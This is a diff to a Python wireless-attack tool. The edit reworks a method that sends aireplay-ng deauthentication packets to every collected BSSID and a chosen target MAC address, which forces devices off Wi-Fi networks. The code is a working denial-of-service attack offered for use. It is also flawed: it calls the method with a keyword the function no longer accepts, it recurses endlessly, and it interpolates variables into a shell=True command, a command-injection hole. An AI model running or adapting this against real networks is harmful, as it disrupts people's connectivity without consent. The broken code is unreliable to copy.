@@ -97,18 +97,27 @@ class Functs:
             out = check_call(["airmon-ng", "start", f"{get_var('interface')}", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
 
     class BSSID_METHOD:
-        def deauth(bssid: BSSID):
+        def deauth(_bssid: BSSID):
             """"""
-            for key, value in bssid.bssids.items():
-                Functs.ChannelSys.hopper(value)
+            bssi = [] # type: list[str]
+            chns = [] # type: list[str]
+            for key, value in _bssid.bssids.items():
+                bssi.append(key)
+                chns.append(value)
+            
+            def do_bssid_method(bssid_: str):
                 try:
-                    out = check_output(f"""aireplay-ng -0 5 -a {key} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
+                    out = check_output(f"""aireplay-ng -0 5 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
                     print(f"""==============OUTPUT============\n{out.decode()}\n================================""")
                 except KeyboardInterrupt:
                     Functs.switch(Interface(get_var('interface')), "managed")
                     return
                 except:
-                    Functs.BSSID_METHOD.deauth
+                    Functs.BSSID_METHOD.deauth(bssid=_bssid)
+            
+            for bssid_aa in bssi:
+                do_bssid_method(bssid_aa)
+                Functs.BSSID_METHOD.deauth(bssid=_bssid)
 
 
     class ESSID_METHOD:
